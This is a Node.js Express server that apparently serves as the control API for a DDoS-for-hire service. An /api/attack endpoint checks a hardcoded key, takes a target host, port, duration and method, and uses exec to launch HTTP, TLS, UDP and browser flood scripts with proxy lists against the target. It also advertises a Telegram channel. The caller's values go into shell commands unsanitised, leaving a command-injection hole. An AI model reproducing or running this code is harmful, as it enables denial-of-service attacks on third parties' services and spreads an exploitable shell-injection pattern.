const express = require("express");
const app = express();
const port = 5500;
var exec = require("child_process").exec;

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=bixd&host=<<$host>>&port=<<$port>>&method=<<$method>>&time=<<$time>>`
    };
    return res.status(400).send(err_u);
  }

  if (key !== "leva") {
    const err_key = {
      status: `error`,
      message: `Error Keys`
    };
    return res.status(400).send(err_key);
  }

  if (time > 172000) {
    const err_time = {
      status: `error`,
      message: `Error Time < 60 Second`
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === "bypass" ||
      method.toLowerCase() === "tls" ||
      method.toLowerCase() === "udp" ||
      method.toLowerCase() === "h1"
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `t.me/cyberviet`,
    };
    return res.status(400).send(err_method);
  }

  const jsonData = {
    status: `success`,
    message: `Send Attack Successful`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
    info: `t.me/cyberviet`,
  };
  res.status(200).send(jsonData);
  if (method.toLowerCase() === "bypass") {
    exec(
      `node d.js GET ${host} ${time} 8 90 p.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "h1") {
    exec(
      `node h1.js ${host} ${time}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "udp") {
    exec(
      `perl f.pl ${host} ${port} 300 ${time}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "browser") {
    exec(
      `node browser.js ${host} 5 10 proxy.txt 50 ${time}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
});
app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});
